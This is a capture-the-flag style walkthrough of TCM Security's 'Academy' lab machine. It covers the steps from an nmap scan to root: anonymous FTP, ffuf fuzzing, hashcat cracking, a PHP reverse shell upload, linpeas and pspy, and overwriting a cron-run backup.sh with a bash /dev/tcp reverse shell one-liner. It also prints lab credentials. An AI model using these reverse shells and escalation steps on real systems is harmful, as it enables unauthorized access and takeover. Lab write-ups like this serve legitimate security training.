---
layout: post
title: Academy: Walkthrough
date: 2024-01-11 19:53 +0100
categories: [CTF, Others]
tags: [nmap,ftp,http,ffuf,linux,privilege escalation,linpeas,hashcat,cronjob,pspy]
---

# Summary

This box was created by **TCM Security** for their Practical Ethical Hacking course and the experience is more **practical** rather than ctf oriented.

# Scanning & Enumeration

## Nmap

```bash
sudo nmap -T4 -A -p- 10.0.2.152 -oA ~/Academy/nmap
```

```bash
# Nmap 7.94SVN scan initiated Wed Jan 10 03:03:48 2024 as: nmap -T4 -A -p- -oA /home/kali/Academy/nmap 10.0.2.152
Nmap scan report for 10.0.2.152
Host is up (0.00055s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.0.2.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 08:00:27:49:E6:61 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.55 ms 10.0.2.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 10 03:04:07 2024 -- 1 IP address (1 host up) scanned in 19.89 seconds
```
### Findings

Ports **21**, **22**, and **80** are the only ports open on our target based on our Nmap scan.

## FTP

```bash
ftp 10.0.2.152
```

- Ftp (21) seems to allow `Anonymous` login.

- We were able to confirm this by anonymous login to ftp and we used `anonymous` as the username and password.

*[Image: ftp]*

- We found a text file on the `ftp` server called **note.txt**

*[Image: ftp note]*

- From the text file, we found that `jdelta` left a message for `Heath` that `Grimme` had set up a test site for their new academy.

*[Image: note]*

- `jdelta` informed `Grimme` not to use the same password everywhere, he will change it ASAP.

- We also got to know that `jdelta` couldn't create a user via the admin panel but instead inserted directly into the database with the following command:

```bash
INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');
```

- Lastly, the `StudentRegno` was used to login. 

## HTTP

We navigated to `http://10.0.2.18` on our web browser and found a default **Apache2 Debian** page on the test website. Also, we found that the web server is version `2.4.38 Apache HTTP Server` after fingerprinting with **Wappalyzer**

*[Image: default page]*

*[Image: fingerprint]*

### Directory Fuzzing with FFuF

We couldn't find anything to work with on the website so we did some **directory fuzzing** with a tool called [ffuf](https://github.com/ffuf/ffuf) to find hidden directories or files on the webserver.

```bash
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.0.2.152/FUZZ
```

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.0.2.152/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.152/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 4ms]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 19ms]
academy                 [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 15ms]
phpmyadmin              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 9ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 14ms]
:: Progress: [20469/20469] :: Job [1/1] :: 3508 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Findings:

- We found 5 hidden directories on the webserver (**.htaccess**, **.htpasswd**, **academy**, **phpmyadmin**, **server-status**)

- We were denied access to **.htaccess**, **.htpasswd**, and **server-status** but were able to further validate the webserver's version due to some information disclosure.

*[Image: htaccess]*

*[Image: htpasswd]*

*[Image: server]*

- We found an online course registration portal in the **academy** directory. And this confirms **jdelta**'s message in the `note.txt` file.

*[Image: portal]*

- We found a php admin login page in the **phpmyadmin** directory. 

*[Image: php portal]*

- We also tried the default credential (root:password) for phpmyadmin but couldn't get access.

*[Image: default credential]*

*[Image: denied]*

- We did further directory fuzzing on **phpmyadmin** directory and found a bunch of other hidden directories and files. However, they led to nothing because we couldn't access any of them.

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.0.2.152/phpmyadmin/FUZZ

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.2.152/phpmyadmin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 4ms]
ChangeLog               [Status: 200, Size: 17598, Words: 2990, Lines: 254, Duration: 327ms]
LICENSE                 [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 310ms]
README                  [Status: 200, Size: 1520, Words: 181, Lines: 53, Duration: 303ms]
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 1284ms]
doc                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 0ms]
examples                [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 3ms]
favicon.ico             [Status: 200, Size: 22486, Words: 70, Lines: 98, Duration: 55ms]
js                      [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 2ms]
libraries               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 6ms]
locale                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 4ms]
setup                   [Status: 401, Size: 457, Words: 42, Lines: 15, Duration: 9ms]
robots.txt              [Status: 200, Size: 26, Words: 3, Lines: 3, Duration: 456ms]
sql                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 12ms]
templates               [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 19ms]
themes                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 15ms]
vendor                  [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 19ms]
:: Progress: [20469/20469] :: Job [1/1] :: 3333 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

### Academy Test Site

Looking back at **jdelta**'s message in **note.txt**, the `StudentRegno` was used to login and we tried to login with the credentials (10201321:cd73502828457d15655bbd7a63fb0bc8) but couldn't gain access. 

It seems that the password is a hash so we used `hash-identifier` and [CyberChef](https://gchq.github.io/CyberChef/) to check the hash type.

*[Image: hash]*

*[Image: cyberchef]*

We identified the hash type to be `MD5` and then we used `hashcat` to crack the hash.

```bash
hashcat -a 0 -m 0 cd73502828457d15655bbd7a63fb0bc8 /usr/share/wordlists/rockyou.txt
```

*[Image: hashcat]*

The password is `student` and we used it to login to the online course registration portal.

*[Image: login]*

In the `My Profile` tab, there is a file upload functionality that accepts other file extenstion other than jpeg or png. Therefore it is susceptible to **file upload** vulnerability and we tested it out by uploading a php reverse shell script. Note that the server runs a `phpmyadmin` database manager in the backend.

File upload vulnerability is when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Learn more [here](https://portswigger.net/web-security/file-upload)

See [demonstration video](https://www.veed.io/view/4f642bc7-f952-499a-a193-9cf41048c0d3?panel=share) 

We used Pentest Monkey's php_reverse_shell script with **netcat** to catch a reverse shell on our attacker machine. See [here](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

**Note**: change the `ip` address in the script to your attacker machine ip address and change the port number (optional)

*[Image: pentest reverse]*

*[Image: reverse]*

We got a successful reverse shell on our attacker machine.

## Privilege Escalation

We did some manual privilege escalation but we couldn't find anything to work with. We were only able to view `/etc/passwd` file and we found that **Grimme** is an administrator on this machine.

*[Image: etc]*

We then used [**linpeas**](https://github.com/carlospolop/PEASS-ng) to perform more advanced privilege escalation on our target machine.

*[Image: linpeas]*

We transfered the linpeas script from our attacker machine to the **/tmp** folder on our target machine.

**Note**: Don't forget to change the linpeas script to executable before running it

```bash
chmod +x linpeas.sh
```

```bash
./linpeas.sh
```

*[Image: grimme]*

From linpeas result, we found **two** interesting things:

- A backup script in `/home/grimmie/backup.sh`

- a password for mysql database in `/var/www/html/academy/admin/includes/config.php`

*[Image: sql]*

The password turns out to be for `Grimmie`

*[Image: config php]*

### SSH

Looking back at our nmap scan, ssh was open on port `22` so we decided to use Grimmie's credentials (grimmie:My_V3ryS3cur3_P4ss) to login via ssh.

```bash
ssh grimmie@10.0.2.152
```

*[Image: ssh login]*

We were able to login successfully with Grimmie's credentials and found the `backup.sh` script.

*[Image: backup]*

The script:
1. Removes the existing file `/tmp/backup.zip` if it exists.
2. Creates a new ZIP archive named `backup.zip` in the `/tmp` directory.
3. Adds the contents of the `/var/www/html/academy/includes` directory to the ZIP archive.
4. Sets the file permissions of the newly created ZIP archive to `700` (read, write, and execute only for the owner).

#### Pspy

We did some manual privilege escalation to look for cron jobs runing the backup script but couldn't find any. 

So we used a tool called [**Pspy**](https://github.com/DominicBreuker/pspy) to snoop on processes without need for root permissions, as well as to see commands run by other users, cron jobs, etc. as they execute.

*[Image: pspy]*

```bash
chmod +x pspy64
```

```bash
./pspy64
```

*[Image: result]*

From the result, we can see that the backup script is executed by a cron job in the background. 

We will abuse this to gain a reverse shell by replacing the commands in the `backup.sh` script with a bash reverse shell one liner command. So once the backup script is executed again in the background, we should get a reverse shell on our attacker machine.

```bash
bash -i >& /dev/tcp/10.0.2.18/8080 0>&1
```

**Note**: Add this one liner command to replace the command in **backup.sh**

## Pwned

*[Image: pwned]*

The cron job executed the script successfully and we got **root** access on the machine :)

